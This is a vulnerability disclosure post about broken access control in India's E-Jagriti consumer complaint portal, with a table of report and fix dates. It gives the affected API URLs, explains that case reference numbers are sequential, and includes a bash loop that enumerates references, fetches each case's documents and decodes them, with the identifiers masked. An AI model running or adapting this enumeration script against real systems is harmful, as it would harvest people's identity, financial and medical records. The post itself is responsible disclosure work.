---
title: E-Jagriti portal vulnerabilities 2025
date:
    created: 2025-08-14
    updated: 2025-09-12
---

The EJagriti portal (<https://e-jagriti.gov.in>), which is an upgrade of
e-daakhil portal, is mandatory for consumer complaint filing and tracking.
Any complaint has to be uploaded on this portal before submitting it to the
consumer commission registry. It is developed and maintained by NIC(<https://nic.gov.in>)
and content owned by the Department Of Consumer Affairs, Ministry Of Consumer Affairs,
Food & Public Distribution, Government Of India.

These vulnerabilities allowed access to all case
documents (including sensitive information such as ID proofs, affidavits with
sign, complaint details, and depending on the case: medical records, bank
details, purchase details, land records etc. ) in a trivial manner. Further,
the case reference ID, being a serially increasing number, allowed serial
access to all other users' case documents.

Summary of the vulnerabilities

| Sr | API  | Date reported | Date fixed | Days taken | CERT-in reference number |
|----|------|---------------|------------|------------|--------------------------|
| 1  | [CaseFilingDocumentDetails](#1-casefilingdocumentdetails) | 31 May 2025 | Partial fix before 17 June. Full fix never confirmed to me. Guessing July | 18-47 | 38480225 |
| 2  | [getAllComplainantRespondantDetails](#2-getallcomplainantrespondantdetails) | 31 May 2025 | Partial fix before 17 June. Full fix never confirmed to me. Guessing July | 18-47 | 38480225 |

Root cause in [OWASP](https://cheatsheetseries.owasp.org/index.html) terms:

- A01 2021 Broken Access Control: CWE-35 Path Traversal, CWE-284 Improper
  Access Control, CWE-285 Improper Authorization
- A04 2021 Insecure Design: Insecure Direct Object Reference
- A07 2021 Identification and Authentication Failures: CWE-287 Improper
  Authentication, CWE-613 Insufficient Session Expiration

<!-- more -->

In my <https://pgportal.gov.in> complaint and appeal, I was assured that after fixing
the issue, they will reach out to me for verification. But that hasn't
happened as of the date of 12 September 2025. In a public "jansunwai" in the
last week of August, the e-jagriti officers confirmed to me that they have
fixed the issue and I can proceed with the public release of this report.

### 1. CaseFilingDocumentDetails

This API accepted a query parameter `fillingReferenceNumber` and retrieves
details about the case filing documents, masked as `$$$$`. This case
reference is simply a date in format `YYYYMMDD` followed by a 4 digit
serially increasing number, xxxx starting from 0001.

This API returned the following files:

1. the memo of parties which contains PII of the complainant, address, phone
number, email ID, etc.,
2. complaint itself which contains sensitive information like bank account details,
Aadhaar number, policy number, income information,
3. Signed annexures which have identity proofs, signature, affidavit, etc.
4. Judgement and orders related to the case.
5. Any replies or rejoinders filed by the complainant or the opposite party.

Simply opening this URL in the browser was enough

```bash title="sample_urls.sh" linenums="1"
https://e-jagriti.gov.in/services/case/caseFilingService/v2/getCaseFillingDocumentDetails?fillingReferenceNumber=$$$$
```

However, for decoding the base64-encoded files, this is a sample script.
The output contained an array of objects (accessible via `jq` (<https://jqlang.org/>))
which had base64 encoded file, which can be decoded to get the actual PDF or image file.

```bash title="sample_script.sh" linenums="1" hl_lines="1 4 12"
for reference in {$$$$$$$$..$$$$$$$$}; do
    timestamp=$(date '+%F_%T')
    outname="output_doc_${reference}_${timestamp}"
    curl -v 'https://e-jagriti.gov.in/services/case/caseFilingService/v2/getCaseFillingDocumentDetails?fillingReferenceNumber=$$$$'"$reference" \
    -o "${outname}.json"

    jq '.' "${outname}.json" > "${outname}_pretty.json"

    jq -r '.data.caseFillingDocumentDetailsResponseList[] | "\(.fileName)\t\(.fileContent)"' "${outname}.json" | while IFS=$'\t' read -r fileName fileContent; do
        echo "${fileContent}" > "${outname}_files_${fileName}.txt"
        base64 --decode "${outname}_files_${fileName}.txt" > "${outname}_files_${fileName}.pdf"
    done
done
```

### 2. getAllComplainantRespondantDetails

This API differs from the above in that this output is machine readable JSON
text. The above API returns a document which contained the document.

This API returned the following data:

1. the personal contact details of parties which contained address, phone
number, email ID, etc.

```bash title="sample_urls.sh" linenums="1"
https://e-jagriti.gov.in/services/case/caseFilingService/v2/getAllComplainantRespondantDetails?filingReferenceNumber=$$$$
```
